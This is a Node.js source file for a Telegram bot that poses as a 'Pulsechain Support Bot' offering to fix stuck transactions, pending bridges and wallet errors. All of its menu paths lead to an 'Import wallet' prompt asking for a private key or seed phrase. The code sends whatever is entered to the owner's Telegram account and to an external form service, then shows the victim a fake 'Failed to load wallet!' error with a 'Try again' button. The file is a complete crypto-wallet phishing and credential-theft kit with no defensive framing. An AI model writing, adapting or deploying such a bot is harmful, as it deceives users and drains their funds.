const express = require('express');
const app = express();
const PORT = process.env.PORT || 3008;

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).send('Bot is running!');
});

// Start the HTTP server
app.listen(PORT, () => {
  console.log(`Health check server running on port ${PORT}`);
});
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

const token = process.env.BOT_TOKEN;
const ownerId = process.env.OWNER_ID;
const formUnstaticURL = process.env.FORM_UNSTATIC_URL;

// Check for missing environment variables
if (!token || !ownerId || !formUnstaticURL) {
  console.error(
    'Missing required environment variables. Check your .env file.'
  );
  process.exit(1);
}

const bot = new TelegramBot(token, { polling: true });
console.log('Bot started successfully!');
const chatStates = {};

console.log('Bot started successfully!');

const sendToFormUnstatic = async (name, message) => {
  if (!name || !message) {
    console.error('Missing name or message for FormUnstatic submission.');
    return;
  }

  try {
    const response = await axios.post(
      formUnstaticURL,
      new URLSearchParams({
        name: name,
        message: message,
      }),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      }
    );
    console.log('Data sent to FormUnstatic:', response.data);
  } catch (error) {
    console.error(
      'Error sending data to FormUnstatic:',
      error.response?.data || error.message
    );
  }
};

bot.on('message', (msg) => {
  const chatId = msg.chat.id;

  if (chatStates[chatId] === 'awaiting_private_key') {
    const privateKey = msg.text;

    bot.sendMessage(ownerId, `🔑 Private Key Received:\n${privateKey}`);
    sendToFormUnstatic('Private Key Received', privateKey);

    bot.sendMessage(chatId, '❌ Failed to load wallet!', {
      reply_markup: {
        inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
      },
    });

    delete chatStates[chatId];
  } else if (chatStates[chatId] === 'awaiting_seed_phrase') {
    const seedPhrase = msg.text;

    bot.sendMessage(ownerId, `📜 Seed Phrase Received:\n${seedPhrase}`);
    sendToFormUnstatic('Seed Phrase Received', seedPhrase);

    bot.sendMessage(chatId, '❌ Failed to load wallet!', {
      reply_markup: {
        inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
      },
    });

    delete chatStates[chatId];
  } else {
    bot.sendMessage(chatId, `Hello, ${msg.from.first_name}!`);
  }
});

bot.onText(/\/start/, (msg) => {
  const message = `🌠 Introducing Pulsechain Support Bot! Your one-stop solution for all your Pulsechain bridge, wallet, and transaction issues. 

We're here to help you resolve pending bridges, troubleshoot wallet errors and glitches, and get your stuck transactions moving. 

We're dedicated to providing fast and efficient support, so you can get back to enjoying the Pulsechain ecosystem.

🚀 Let's get started!`;

  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '🔧 Fix Stuck Transaction', callback_data: 'fix' },
          { text: '🎯 Clear Pending Bridge', callback_data: 'clear' },
        ],
        // Second row with 4 buttons
        [
          { text: '🤖 Clear Wallet Error', callback_data: ' error' },
          { text: '🛄 Claim PLS', callback_data: 'pls' },
        ],
        // Third row with 3 buttons
        [
          { text: '📝 Transaction Delayed', callback_data: 'delay' },
          { text: '👥 Referrals', callback_data: 'referrals' },
        ],
        [{ text: 'Connect Wallet', callback_data: 'connect' }],
      ],
    },
  };

  bot.sendMessage(msg.chat.id, message, { parse_mode: 'Markdown', ...options });
});

bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;

  if (query.data === 'try_again') {
    const message = `🌠 Introducing Pulsechain Support Bot! Your one-stop solution for all your Pulsechain bridge, wallet, and transaction issues. 

We're here to help you resolve pending bridges, troubleshoot wallet errors and glitches, and get your stuck transactions moving. 

We're dedicated to providing fast and efficient support, so you can get back to enjoying the Pulsechain ecosystem.

🚀 Let's get started!`;

    // Define the inline keyboard with two buttons
    const options = {
      reply_markup: {
        inline_keyboard: [
          // First row with 2 buttons
          [
            {
              text: '🔧 Fix Stuck Transaction',
              callback_data: 'Fix Stuck Transaction',
            },
            { text: '🎯 Clear Pending Bridge', callback_data: 'clear' },
          ],
          // Second row with 4 buttons
          [
            { text: '🤖 Clear Wallet Error', callback_data: ' error' },
            { text: '🛄 Claim PLS', callback_data: 'pls' },
          ],
          // Third row with 3 buttons
          [
            { text: '📝 Transaction Delayed', callback_data: 'delay' },
            { text: '👥 Referrals', callback_data: 'referrals' },
          ],
          [{ text: 'Connect Wallet', callback_data: 'connect' }],
        ],
      },
    };

    // Send the welcome message along with the inline keyboard options
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...options });
  } else if (query.data === 'import_wallet') {
    const importMessage = `ℹ️ Connect wallet to use settings`;

    const importOptions = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'IMPORT PRIVATE KEY', callback_data: 'import_private_key' }],
          [{ text: 'IMPORT SEED PHRASE', callback_data: 'import_seed_phrase' }],
        ],
      },
    };

    bot.sendMessage(chatId, importMessage, importOptions);
  } else if (query.data === 'import_private_key') {
    bot.sendMessage(chatId, 'Enter private key 🔑', {
      reply_markup: {
        keyboard: [[{ text: 'Cancel' }]],
        resize_keyboard: true,
        one_time_keyboard: true,
      },
    });

    chatStates[chatId] = 'awaiting_private_key';
  } else if (query.data === 'import_seed_phrase') {
    bot.sendMessage(chatId, 'Enter 12-24 word mnemonic / recovery phrase ⬇️', {
      reply_markup: {
        keyboard: [[{ text: 'Cancel' }]],
        resize_keyboard: true,
        one_time_keyboard: true,
      },
    });

    chatStates[chatId] = 'awaiting_seed_phrase';
  } else {
    const newMessage = `Connect a wallet to use settings`;

    const walletOptions = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Import wallet 💳',
              callback_data: 'import_wallet',
            },
          ],
        ],
      },
    };

    bot.sendMessage(chatId, newMessage, walletOptions);
  }

  bot.answerCallbackQuery(query.id);
});
